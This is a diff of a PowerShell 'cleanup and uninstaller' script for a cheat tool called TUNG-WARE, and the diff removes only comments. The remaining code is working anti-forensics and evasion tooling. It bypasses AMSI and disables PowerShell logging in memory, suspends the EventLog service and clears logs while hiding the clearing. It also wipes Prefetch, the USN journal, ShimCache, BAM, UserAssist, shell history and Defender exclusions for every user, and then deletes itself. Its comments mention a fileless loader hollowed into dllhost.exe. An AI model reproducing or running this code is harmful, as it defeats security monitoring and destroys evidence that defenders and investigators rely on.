@@ -1,10 +1,3 @@
-﻿# ==============================================================================
-# TUNG-WARE Cheat Environment Advanced Cleanup & Performance Uninstaller
-# ==============================================================================
-# Upgraded with high-resolution stopwatch timing, fast parallelized .NET 
-# event log clearing, audit logs, and an interactive telemetry summary.
-# Must be executed in an Administrator PowerShell window.
-# ==============================================================================
 param (
     [switch]$FullUninstall = $false,
     [switch]$NoAuditLog = $false
@@ -16,14 +9,11 @@ $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
 $storedWorkspace = (Get-ItemProperty -Path $regPath -Name 'Workspace' -ErrorAction SilentlyContinue).Workspace
 $storedServerUrl = (Get-ItemProperty -Path $regPath -Name 'ServerUrl' -ErrorAction SilentlyContinue).ServerUrl
 
-# Persistence is tracked via registry key presence (fileless - no .tungware_persistence file)
 $persistEnabled = ((Get-ItemProperty -Path $regPath -Name 'Configuration' -ErrorAction SilentlyContinue).Configuration) -and -not $FullUninstall
 
-# Define script root directory (handles both script execution and copy-paste execution)
 $scriptRoot = if ($PSScriptRoot) { $PSScriptRoot } elseif ($PWD -and $PWD.Path) { $PWD.Path } else { (Get-Location).Path }
 if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }
 
-# Verify Administrator privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "==========================================================" -ForegroundColor Red
@@ -45,11 +35,7 @@ Write-Host "==========================================================" -Foregro
 Write-Host "       TUNG-WARE SYSTEM CLEANER & ENVIRONMENT UNINSTALLER       " -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Cyan
 
-# ==============================================================================
-# Stealth In-Memory PowerShell Logging & Security Bypass
-# ==============================================================================
 try {
-    # 1. Disable ScriptBlock, Module, and Transcription logging in memory for this session
     $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
     if ($utils) {
         $gpoSettings = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
@@ -73,16 +59,12 @@ try {
             }
         }
     }
-    # 2. Bypass AMSI in memory for this process (preventing security signature scanning logging)
     $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     if ($amsi) {
         $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
     }
 } catch {}
 
-# ==============================================================================
-# Stealth Service Controllers & Win32 APIs
-# ==============================================================================
 $apiSource = @"
 using System;
 using System.Runtime.InteropServices;
@@ -127,21 +109,18 @@ function Resume-EventLogService {
     }
 }
 
-# Stats tracker
 $perfStats = [System.Collections.Generic.List[PSCustomObject]]::new()
 $totalCleanedFiles = 0
 $totalCleanedKeys = 0
 $totalCleanedLogs = 0
 $totalDurationMs = 0
 
-# Helper to get all user profiles (excluding Public, Default, and system accounts)
 function Get-UserProfilePaths {
     Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue | 
         Where-Object { $_.Name -notmatch '(?i)^(Public|Default|All Users|Default User)$' } |
         ForEach-Object { $_.FullName }
 }
 
-# Helper function to remove all Alternate Data Streams (ADS) from a file before deletion
 function Clear-FileAlternateDataStreams {
     param (
         [string]$FilePath
@@ -158,7 +137,6 @@ function Clear-FileAlternateDataStreams {
     }
 }
 
-# Helper function to rename a file to a random name before deletion (MFT bypass)
 function Safe-DeleteFile {
     param (
         [string]$FilePath
@@ -181,20 +159,17 @@ function Safe-DeleteFile {
     }
 }
 
-# Helper function to recursively rename and delete folders (MFT bypass)
 function Safe-DeleteFolder {
     param (
         [string]$FolderPath
     )
     if (Test-Path $FolderPath) {
         try {
-            # Safely delete all files inside first
             $files = Get-ChildItem -Path $FolderPath -Recurse -File -ErrorAction SilentlyContinue
             foreach ($f in $files) {
                 Safe-DeleteFile -FilePath $f.FullName
             }
             
-            # Safely delete subfolders
             $subdirs = Get-ChildItem -Path $FolderPath -Recurse -Directory -ErrorAction SilentlyContinue | Sort-Object FullName -Descending
             foreach ($d in $subdirs) {
                 if (Test-Path $d.FullName) {
@@ -223,7 +198,6 @@ function Safe-DeleteFolder {
     }
 }
 
-# Helper function to get ROT13 translation of a string
 function Get-Rot13 {
     param (
         [string]$InputString
@@ -242,14 +216,12 @@ function Get-Rot13 {
     return $rot -join ''
 }
 
-# Helper function to clean specific registry hives (loaded or offline)
 function Clean-RegistryHive {
     param (
         [string]$BasePath,
         [ref]$CleanedKeysCount
     )
 
-    # 1. Target Accessibility configuration propert(ies)
     $accessPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Accessibility"
     if (Test-Path $accessPath) {
         $props = @('Configuration', 'ServerUrl', 'Workspace', 'Persistence')
@@ -266,14 +238,12 @@ function Clean-RegistryHive {
         }
     }
 
-    # 2. Target Software\TUNG-WARE key
     $TUNG-WAREKey = Join-Path $BasePath "Software\TUNG-WARE"
     if (Test-Path $TUNG-WAREKey) {
         Remove-Item -Path $TUNG-WAREKey -Recurse -Force -ErrorAction SilentlyContinue
         $CleanedKeysCount.Value++
     }
     
-    # Also clean up dynamically created Software keys matching the pattern in this hive
     $softwareBase = Join-Path $BasePath "Software"
     if (Test-Path $softwareBase) {
         $matchedKeys = Get-ChildItem -Path $softwareBase -ErrorAction SilentlyContinue |
@@ -284,7 +254,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 3. MUICache references (Search under multiple classes paths)
     $muiCachePaths = @(
         Join-Path $BasePath "Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
         Join-Path $BasePath "Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
@@ -304,10 +273,8 @@ function Clean-RegistryHive {
         }
     }
 
-    # 4. UserAssist entries
     $userAssistPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
     if (Test-Path $userAssistPath) {
-        # Dynamically build ROT13 keywords
         $plainKeywords = @("TUNG-WARE", "RobloxPlayerBeta", "RobloxCrashHandler", "delta", "B332FDC6", "setup", "installer", "cleanup")
         if ($scriptRoot) { $plainKeywords += $scriptRoot }
         if ($storedWorkspace) { $plainKeywords += $storedWorkspace }
@@ -335,7 +302,6 @@ function Clean-RegistryHive {
                                 break
                             }
                         }
-                        # Also check the original typo'd key just in case
                         if (-not $match -and ($val -like "*O332SDQ6*")) {
                             $match = $true
                         }
@@ -349,7 +315,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 5. AppCompatFlags Compatibility Store
     $compatPath = Join-Path $BasePath "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
     if (Test-Path $compatPath) {
         $key = Get-Item -Path $compatPath -ErrorAction SilentlyContinue
@@ -364,7 +329,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 6. ComDlg32 OpenSavePidlMRU, LastVisitedPidlMRU, and RecentDocs
     $comDlgPaths = @(
         Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
         Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
@@ -400,7 +364,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 7. RunMRU
     $runMruPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
     if (Test-Path $runMruPath) {
         $runMru = Get-Item -Path $runMruPath -ErrorAction SilentlyContinue
@@ -418,7 +381,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 8. TypedPaths
     $typedPathsBase = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
     if (Test-Path $typedPathsBase) {
         $tpKey = Get-Item -Path $typedPathsBase -ErrorAction SilentlyContinue
@@ -434,7 +396,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 9. WordWheelQuery
     $wordWheelPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"
     if (Test-Path $wordWheelPath) {
         $wwKey = Get-Item -Path $wordWheelPath -ErrorAction SilentlyContinue
@@ -458,7 +419,6 @@ function Clean-RegistryHive {
         }
     }
 
-    # 11. Run key TungWarePortal
     $runKeyPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Run"
     if (Test-Path $runKeyPath) {
         $runKey = Get-Item -Path $runKeyPath -ErrorAction SilentlyContinue
@@ -469,7 +429,6 @@ function Clean-RegistryHive {
     }
 }
 
-# Helper function to track performance of a step
 function Run-CleanupStep {
     param (
         [string]$StepName,
@@ -512,7 +471,6 @@ function Run-CleanupStep {
     Write-Host ""
 }
 
-# Temporarily disable event logging channels during cleanup to maintain stealth
 $tempDisabledChannels = @(
     "Microsoft-Windows-PowerShell/Operational",
     "Windows PowerShell",
@@ -530,15 +488,11 @@ foreach ($chan in $tempDisabledChannels) {
     try { wevtutil.exe sl $chan /e:false 2>$null } catch {}
 }
 
-# Now suspend the EventLog service to prevent logging of cleanup actions
 $suspendedLogPid = Suspend-EventLogService
 
 try {
-    # 1. Terminate running processes
     Run-CleanupStep "1/9: Terminating loader and server processes" {
         $count = 0
-    # Fileless loader runs inside a hollowed dllhost.exe on port 9876.
-    # Identify it by finding the process owning port 9876.
     $conn = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
     if ($conn) {
         foreach ($c in $conn) {
@@ -546,7 +500,6 @@ try {
             $count++
         }
     }
-    # Clean up updates server running on port 3000
     $serverConn = Get-NetTCPConnection -LocalPort 3000 -State Listen -ErrorAction SilentlyContinue
     if ($serverConn) {
         foreach ($sc in $serverConn) {
@@ -554,14 +507,12 @@ try {
             $count++
         }
     }
-    # Also kill any legacy file-based, fallback or runner processes if still present
     $targetProcNames = @(
         "RobloxPlayerBeta", "RobloxPlayerBeta_fallback", "RobloxPlayerBetaBootstrapper",
         "RobloxCrashHandler", "RobloxCrashHandler_fallback", "RobloxCrashHandlerBootstrapper",
         "TUNG-WARE", "TUNGWAREHost", "TUNGWARELoader", "loader", "host", "injector"
     )
     $legacy = Get-Process -Name $targetProcNames -ErrorAction SilentlyContinue
-    # Wildcard matches for dynamically generated names
     $dynamicLegacy = Get-Process -ErrorAction SilentlyContinue | Where-Object {
         $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*"
     }
@@ -577,11 +528,9 @@ try {
     return "Terminated $count process(es)"
 }
 
-# 2. End and delete the UAC-bypassed Scheduled Task, firewall rules, and BITS jobs
 Run-CleanupStep "2/9: Removing Scheduled Tasks, Firewall Rules, and BITS Jobs" {
     $details = ""
     
-    # 2a. Scheduled Tasks
     $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { 
         $_.TaskName -eq "RobloxPlayerBeta" -or 
         $_.TaskName -eq "RobloxPlayerBetaBootstrapper" -or 
@@ -603,7 +552,6 @@ Run-CleanupStep "2/9: Removing Scheduled Tasks, Firewall Rules, and BITS Jobs" {
         $details += "Removed $taskCount task(s)"
     }
     
-    # 2b. Firewall Rules
     $firewallRules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object {
         $_.DisplayName -like "*RobloxPlayerBeta*" -or $_.Name -like "*RobloxPlayerBeta*"
     }
@@ -619,7 +567,6 @@ Run-CleanupStep "2/9: Removing Scheduled Tasks, Firewall Rules, and BITS Jobs" {
         $details += "Removed $fwCount firewall rule(s)"
     }
     
-    # 2c. BITS Jobs
     $bitsCount = 0
     try {
         Import-Module BitsTransfer -ErrorAction SilentlyContinue
@@ -642,7 +589,6 @@ Run-CleanupStep "2/9: Removing Scheduled Tasks, Firewall Rules, and BITS Jobs" {
     return "No matching tasks, firewall rules, or BITS jobs found"
 }
 
-# 3. Clean up any legacy installed binary folder (fileless installs don't create this)
 Run-CleanupStep "3/9: Checking for legacy binary folders (LocalAppData)" {
     $filesWiped = 0
     $targets = [System.Collections.Generic.List[string]]::new()
@@ -663,7 +609,6 @@ Run-CleanupStep "3/9: Checking for legacy binary folders (LocalAppData)" {
     return "No legacy LocalAppData folders found (fileless install - expected)"
 }
 
-# 4. Clean up legacy AppData folder (fileless installs don't create this)
 Run-CleanupStep "4/9: Checking for legacy configuration folder (Roaming AppData)" {
     $appdataFolder = "$env:APPDATA\TUNG-WARE"
     $filesWiped = 0
@@ -677,7 +622,6 @@ Run-CleanupStep "4/9: Checking for legacy configuration folder (Roaming AppData)
     return "No legacy AppData\TUNG-WARE folder found (fileless install - expected)"
 }
 
-# 5. Clean up temporary directory remnants, WER crash reports/dumps, DNS cache, and WinINet web cache
 Run-CleanupStep "5/9: Cleaning temporary residues, WER crash reports, DNS cache, and WinINet web cache" {
     $tempDir = [System.IO.Path]::GetTempPath()
     $hostFiles = @("TUNGWAREHost.exe", "TUNGWARELoader.exe", "loader.exe", "host.exe", "injector.exe", "TUNGWARE.exe", "cleaner.bat")
@@ -697,20 +641,17 @@ Run-CleanupStep "5/9: Cleaning temporary residues, WER crash reports, DNS cache,
         $cleanedCount++
     }
 
-    # Delete any legacy performance/cleanup logs from Temp directory
     $oldPerfLog = Join-Path $tempDir "tungware_cleanup_perf.log"
     if (Test-Path $oldPerfLog) {
         Safe-DeleteFile -FilePath $oldPerfLog
         $cleanedCount++
     }
     
-    # 5b. Windows Error Reporting (WER) Crash Reports and Mini-dumps (System-wide and Multi-user)
     $werPaths = @(
         "$env:ProgramData\Microsoft\Windows\WER\ReportArchive",
         "$env:ProgramData\Microsoft\Windows\WER\ReportQueue"
     )
     
-    # Add CrashDumps and WER paths for all user profiles
     $profiles = Get-UserProfilePaths
     foreach ($pPath in $profiles) {
         $werPaths += Join-Path $pPath "AppData\Local\CrashDumps"
@@ -733,7 +674,6 @@ Run-CleanupStep "5/9: Cleaning temporary residues, WER crash reports, DNS cache,
         }
     }
     
-    # 5c. WinINet WebClient Cache / IE Temporary Files (Targeted matching only)
     foreach ($pPath in $profiles) {
         $inetCache = Join-Path $pPath "AppData\Local\Microsoft\Windows\INetCache"
         if (Test-Path $inetCache) {
@@ -758,10 +698,8 @@ Run-CleanupStep "5/9: Cleaning temporary residues, WER crash reports, DNS cache,
     return $details
 }
 
-# 6. Remove license key, Defender exclusions, PSReadLine history, and legacy files
 Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine history, and legacy file remnants" {
     $cleaned = ""
-    # Remove registry key used by fileless installer
     $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
     $targetProperties = @('Configuration', 'ServerUrl', 'Workspace', 'Persistence')
     $regWiped = 0
@@ -783,7 +721,6 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
         $cleaned = "Removed configuration propert(ies) and subkey(s) from registry path: Accessibility"
     }
 
-    # Clean up legacy file-based key artifacts if present from old installs
     $legacyFiles = [System.Collections.Generic.List[string]]::new()
     $legacyFiles.Add("$env:USERPROFILE\.tungware_key")
     $legacyFiles.Add("$env:USERPROFILE\.tungware_persistence")
@@ -798,7 +735,6 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
         $legacyFiles.Add((Join-Path $scriptRoot 'key.txt'))
         if ($storedWorkspace) {
             $legacyFiles.Add((Join-Path $storedWorkspace 'key.txt'))
-            # Clean workspace logs and fallbacks
             $legacyFiles.Add((Join-Path $storedWorkspace 'installer_run.log'))
             $legacyFiles.Add((Join-Path $storedWorkspace 'task_debug.log'))
             $legacyFiles.Add((Join-Path $storedWorkspace 'loader_run.log'))
@@ -813,7 +749,6 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
             $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxCrashHandler.exe'))
             $legacyFiles.Add((Join-Path $storedWorkspace 'updates-server\uploads\RobloxCrashHandler.enc'))
         }
-        # Also try relative to script root just in case
         $legacyFiles.Add((Join-Path $scriptRoot 'installer_run.log'))
         $legacyFiles.Add((Join-Path $scriptRoot 'task_debug.log'))
         $legacyFiles.Add((Join-Path $scriptRoot 'loader_run.log'))
@@ -836,12 +771,10 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
         }
     }
 
-    # 6b. Clean up PSReadLine console command history file (Multi-user)
     $historyPaths = [System.Collections.Generic.List[string]]::new()
     foreach ($pPath in $profiles) {
         $historyPaths.Add((Join-Path $pPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt"))
     }
-    # Also add standard active paths just in case
     $historyPaths.Add("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt")
     $historyPaths.Add("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt")
     
@@ -852,14 +785,12 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
             if ($lines) {
                 $originalCount = $lines.Count
                 
-                # Gather patterns including workspace paths, URLs, and base64-encoded commands
                 $patterns = @("TUNG-WARE", "RobloxPlayerBeta", "installer", "setup", "cleanup", "delta", "B332FDC6", "-[eE]n?c?o?d?e?d?[cC]o?m?m?a?n?d?", "-[eE]n?c?")
                 if ($scriptRoot) { $patterns += [regex]::Escape($scriptRoot) }
                 if ($storedWorkspace) { $patterns += [regex]::Escape($storedWorkspace) }
                 if ($storedServerUrl) { $patterns += [regex]::Escape($storedServerUrl) }
                 $regexPattern = ($patterns | ForEach-Object { $_ }) -join "|"
 
-                # Filter out lines matching any patterns
                 $filtered = $lines | Where-Object {
                     $_ -notmatch $regexPattern
                 }
@@ -874,7 +805,6 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
         $cleaned += "; Pruned $prWipedCount line(s) from PSReadLine history"
     }
 
-    # 6c. Clean up Windows Defender Exclusions registered by installer/setup
     $defExWiped = 0
     $exclusions = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
     if ($exclusions) {
@@ -901,12 +831,10 @@ Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine hist
     return "No license key, Defender exclusions, PSReadLine history, or legacy files found"
 }
 
-# 7. Clean up Windows Prefetch (.pf) traces, SysMain databases, and NTFS USN Journal
 Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and NTFS USN Journal" {
     $prefetchDir = "$env:SystemRoot\Prefetch"
     $cleanedCount = 0
     if (Test-Path $prefetchDir) {
-        # 7a. Target program-specific prefetch files
         $traceKeywords = @("RobloxPlayerBeta*", "TUNG-WARE*")
         $prefetchFiles = [System.Collections.Generic.List[System.IO.FileInfo]]::new()
         
@@ -922,14 +850,12 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
             $cleanedCount++
         }
 
-        # 7b. Scan all other prefetch files for embedded strings pointing to the cheat paths or names
         $keywords = @('RobloxPlayerBeta', 'RobloxCrashHandler', 'TUNG-WARE', 'TUNG-WARE', 'delta', 'B332FDC6', 'setup', 'installer', 'cleanup')
         if ($scriptRoot) { $keywords += $scriptRoot }
         if ($storedWorkspace) { $keywords += $storedWorkspace }
 
         $allPfFiles = Get-ChildItem -Path $prefetchDir -Filter '*.pf' -ErrorAction SilentlyContinue
         foreach ($file in $allPfFiles) {
-            # Skip if already deleted
             if (-not (Test-Path $file.FullName)) { continue }
             try {
                 $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
@@ -938,7 +864,6 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
                     $asciiBytes = [System.Text.Encoding]::ASCII.GetBytes($kw)
                     $unicodeBytes = [System.Text.Encoding]::Unicode.GetBytes($kw)
                     
-                    # Check ASCII
                     for ($i = 0; $i -le ($bytes.Length - $asciiBytes.Length); $i++) {
                         $match = $true
                         for ($j = 0; $j -lt $asciiBytes.Length; $j++) {
@@ -948,7 +873,6 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
                     }
                     if ($match) { break }
                     
-                    # Check Unicode
                     for ($i = 0; $i -le ($bytes.Length - $unicodeBytes.Length); $i++) {
                         $match = $true
                         for ($j = 0; $j -lt $unicodeBytes.Length; $j++) {
@@ -965,7 +889,6 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
             } catch {}
         }
 
-        # 7c. Clean Layout.ini
         $layoutPath = Join-Path $prefetchDir "Layout.ini"
         if (Test-Path $layoutPath) {
             $lines = Get-Content -Path $layoutPath -Encoding Unicode -ErrorAction SilentlyContinue
@@ -984,7 +907,6 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
             }
         }
 
-        # 7d. Clean SuperFetch / SysMain Databases (Ag*.db files)
         $sysmainService = Get-Service -Name "SysMain" -ErrorAction SilentlyContinue
         $wasRunning = $false
         if ($sysmainService -and $sysmainService.Status -eq 'Running') {
@@ -1008,7 +930,6 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
         }
     }
 
-    # 7e. Clear NTFS Change Journal (USN Journal) for all connected NTFS drives
     $volumes = Get-Volume -ErrorAction SilentlyContinue
     foreach ($vol in $volumes) {
         if ($vol.FileSystem -eq "NTFS" -and $vol.DriveLetter) {
@@ -1021,21 +942,17 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch traces, SysMain databases, and N
     return "Wiped $cleanedCount prefetch files/databases, sanitized Layout.ini, and cleared NTFS USN Journal"
 }
 
-# 8. Clean up Registry references and user activity residues (MuiCache, UserAssist, BAM, Task Cache, AppCompatFlags, ComDlg32, RunMRU, Recent Shortcuts)
 Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut residues" {
     $cleanedKeysCount = 0
     $recentWiped = 0
     $jumpWiped = 0
     
-    # 8a. Delete Software keys if they exist (Targeted only)
-    # HKLM-wide (system-wide) TUNG-WARE key
     $hklmTUNG-WARE = "HKLM:\Software\TUNG-WARE"
     if (Test-Path $hklmTUNG-WARE) {
         Remove-Item -Path $hklmTUNG-WARE -Recurse -Force -ErrorAction SilentlyContinue
         $cleanedKeysCount++
     }
     
-    # Also clean up dynamically created Software keys matching the pattern under HKLM
     $hklmSoftwareBase = "HKLM:\Software"
     if (Test-Path $hklmSoftwareBase) {
         $matchedKeys = Get-ChildItem -Path $hklmSoftwareBase -ErrorAction SilentlyContinue |
@@ -1046,7 +963,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
 
-    # 8b. Clean loaded user hives and current user hive
     Clean-RegistryHive -BasePath "HKCU:" -CleanedKeysCount ([ref]$cleanedKeysCount)
     
     $loadedSids = Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | 
@@ -1055,7 +971,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         Clean-RegistryHive -BasePath "Registry::HKEY_USERS\$($sid.PSChildName)" -CleanedKeysCount ([ref]$cleanedKeysCount)
     }
 
-    # 8c. Clean registry for offline users by loading their hives
     $profiles = Get-UserProfilePaths
     foreach ($pPath in $profiles) {
         $username = Split-Path $pPath -Leaf
@@ -1075,7 +990,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
             }
         }
         
-        # Load UsrClass.dat for classes keys
         $usrClassPath = Join-Path $pPath "AppData\Local\Microsoft\Windows\UsrClass.dat"
         if (Test-Path $usrClassPath) {
             $tempHiveName = "TempHiveClass_$username"
@@ -1093,7 +1007,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
 
-    # 8d. Target BAM (Background Activity Monitor) tracking entries (Granular path deletion)
     $bamPaths = @(
         "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings",
         "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
@@ -1116,13 +1029,11 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
 
-    # 8e. Clean residual Task Cache keys if schtasks left any (Tasks, Tree, Logon, Boot, Maintenance)
     $taskTreeBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
     if (Test-Path $taskTreeBase) {
         $taskKeys = Get-ChildItem -Path $taskTreeBase -ErrorAction SilentlyContinue |
             Where-Object { $_.Name -like "*RobloxPlayerBeta*" -or $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
         foreach ($tk in $taskKeys) {
-            # Extract task GUID if present to clean Tasks and Triggers cache
             $taskId = (Get-ItemProperty -Path $tk.PsPath -Name "Id" -ErrorAction SilentlyContinue).Id
             if ($taskId) {
                 $cachePaths = @(
@@ -1143,7 +1054,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
 
-    # 8f. Clean Recent Shortcuts Folder (.lnk files) using COM Target Path Resolution
     $shObj = New-Object -ComObject WScript.Shell
     foreach ($pPath in $profiles) {
         $recentPath = Join-Path $pPath "AppData\Roaming\Microsoft\Windows\Recent"
@@ -1169,7 +1079,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
     
-    # 8g. Clean Startup shortcuts (System-wide and current user)
     $startupShortcuts = @(
         "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
         "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
@@ -1192,7 +1101,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         Safe-DeleteFile -FilePath $tempExe3
     }
 
-    # 8h. Clean Jump Lists for all users (OLE destinations parsing)
     $jumpKeywords = @("TUNG-WARE", "RobloxPlayerBeta", "RobloxCrashHandler", "setup", "installer", "cleanup", "delta", "B332FDC6")
     foreach ($pPath in $profiles) {
         $jumpDirs = @(
@@ -1211,7 +1119,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
                                 $asciiBytes = [System.Text.Encoding]::ASCII.GetBytes($kw)
                                 $unicodeBytes = [System.Text.Encoding]::Unicode.GetBytes($kw)
                                 
-                                # Check ASCII
                                 for ($i = 0; $i -le ($bytes.Length - $asciiBytes.Length); $i++) {
                                     $match = $true
                                     for ($j = 0; $j -lt $asciiBytes.Length; $j++) {
@@ -1221,7 +1128,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
                                 }
                                 if ($matched) { break }
                                 
-                                # Check Unicode
                                 for ($i = 0; $i -le ($bytes.Length - $unicodeBytes.Length); $i++) {
                                     $match = $true
                                     for ($j = 0; $j -lt $unicodeBytes.Length; $j++) {
@@ -1242,7 +1148,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         }
     }
 
-    # 8i. Flush ShimCache (AppCompatCache)
     try {
         rundll32.exe apphelp.dll,ShimFlushCache
     } catch {}
@@ -1253,15 +1158,11 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
 }
 
 } finally {
-    # 9. Clear Trace Logs & Restore Event Log Service
     Run-CleanupStep "9/9: Clearing Trace Logs & Restoring Event Log Channels & Service" {
-        # 9a. Resume the EventLog service first, so we can communicate with it to clear logs
         if ($suspendedLogPid) {
             Resume-EventLogService -ProcessId $suspendedLogPid
         }
 
-        # 9b. Clear the specific operational event logs while their channels are still disabled.
-        # Since the channels are disabled, the EventLog service will not write a "clear log" event (Event 104) to them.
         $targetLogs = @(
             "Microsoft-Windows-PowerShell/Operational", 
             "Windows PowerShell",
@@ -1280,16 +1181,13 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
         $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
         foreach ($log in $targetLogs) {
             try {
-                # Always clear the logs to ensure no trace (including Base64 encoded commands or historical logs) remains
                 $session.ClearLog($log)
                 $wipedCount++
             } catch {
-                # Log might be empty, disabled, or locked, skip gracefully
             }
         }
         $script:totalCleanedLogs += $wipedCount
 
-        # 9c. Re-enable event log channels now that they are clean
         $restoredCount = 0
         foreach ($chan in $targetLogs) {
             try {
@@ -1302,7 +1200,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
     }
 }
 
-# Generate and save permanent audit performance log
 $logPath = Join-Path $env:TEMP "tungware_cleanup_perf.log"
 if ($FullUninstall -or $NoAuditLog) {
     if (Test-Path $logPath) {
@@ -1327,7 +1224,6 @@ if ($FullUninstall -or $NoAuditLog) {
     $logContent.ToString() | Out-File -FilePath $logPath -Encoding utf8 -Force
 }
 
-# Visual summary dashboard
 Write-Host "==========================================================" -ForegroundColor Green
 Write-Host " SUCCESS: Environment has been fully optimized & cleaned!" -ForegroundColor Green
 Write-Host "==========================================================" -ForegroundColor Green
@@ -1342,7 +1238,6 @@ Write-Host "  Total Cleanup Duration:      $totalDurationMs ms (FAST)" -Foregrou
 Write-Host "  Performance Audit Log:       $logPath" -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Green
 
-# If running as the temporary cleanup file, spawn a background command to delete it after exit
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
     Start-Process cmd.exe -ArgumentList "/c timeout /t 2 & del `"$PSCommandPath`"" -WindowStyle Hidden
 }
